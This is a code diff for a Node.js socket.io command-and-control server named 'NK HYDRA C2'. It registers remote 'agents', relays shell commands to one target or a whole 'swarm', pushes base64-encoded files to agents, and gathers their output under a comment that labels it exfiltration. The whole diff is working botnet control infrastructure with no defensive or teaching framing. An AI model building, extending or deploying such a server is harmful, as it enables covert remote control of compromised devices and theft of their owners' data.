@@ -1,3 +1,4 @@
+// SERVER.JS v6.0 - HYDRA CORE
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -5,7 +6,7 @@ const cors = require('cors');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });
+const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); // 100MB buffer
 
 app.use(cors());
 
@@ -16,44 +17,57 @@ io.on('connection', (socket) => {
     socket.on('identify', ({ type, id }) => {
         if (type === 'agent') {
             agents.set(id, socket.id);
-            console.log(`[AGENT] ${id} Connected`);
-            io.emit('log', `[SYSTEM] NEW AGENT: ${id}`);
+            console.log(`[+] AGENT ONLINE: ${id}`);
+            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id}`);
         } else {
-            console.log('[UI] Console Connected');
+            console.log('[+] COMMANDER UI CONNECTED');
         }
     });
 
-    // 2. Comandos (UI -> Agent)
+    // 2. Comandos Gerais
     socket.on('cmd', (data) => {
-        // Suporte a alvo especifico: "@iphone ls -la"
-        const cmd = data.cmd;
-        if (cmd.startsWith('@')) {
-            const parts = cmd.split(' ');
-            const targetId = parts[0].substring(1);
-            const actualCmd = parts.slice(1).join(' ');
-            const targetSocket = agents.get(targetId);
-            
-            if (targetSocket) {
-                io.to(targetSocket).emit('exec', { cmd: actualCmd });
-                io.emit('log', `[CMD] Sent to ${targetId}: ${actualCmd}`);
+        const { cmd, target } = data;
+        if (target && target !== 'all') {
+            const socketId = agents.get(target);
+            if (socketId) {
+                io.to(socketId).emit('exec', { cmd });
+                io.emit('log', `[CMD] -> ${target}: ${cmd}`);
             } else {
-                io.emit('log', `[ERR] Target ${targetId} not found.`);
+                io.emit('log', `[ERR] Target ${target} not found.`);
             }
         } else {
-            // Broadcast para todos (padrão Swarm)
-            io.emit('exec', data);
+            io.emit('exec', { cmd });
+            io.emit('log', `[CMD] -> SWARM: ${cmd}`);
         }
     });
 
-    // 3. Logs (Agent -> UI)
+    // 3. Upload de Arquivos (UI -> Agent)
+    socket.on('upload_file', (data) => {
+        // data: { target, filename, b64content }
+        const { target, filename, b64content } = data;
+        const payload = { cmd: `write_file ${filename} ${b64content}` };
+        
+        if (target && target !== 'all') {
+            const socketId = agents.get(target);
+            if (socketId) {
+                io.to(socketId).emit('exec', payload);
+                io.emit('log', `[UPLOAD] Sending ${filename} to ${target}...`);
+            }
+        } else {
+            io.emit('exec', payload);
+            io.emit('log', `[UPLOAD] Broadcasting ${filename} to SWARM...`);
+        }
+    });
+
+    // 4. Logs e Exfiltração (Agent -> UI)
     socket.on('stream_log', (data) => {
         io.emit('log', `[${data.from}] ${data.output}`);
     });
 
     socket.on('disconnect', () => {
-        // Cleanup agent list logic here if needed
+        // Opcional: Limpar lista de agentes
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`NK C2 v5.0 running on port ${PORT}`));
+server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));
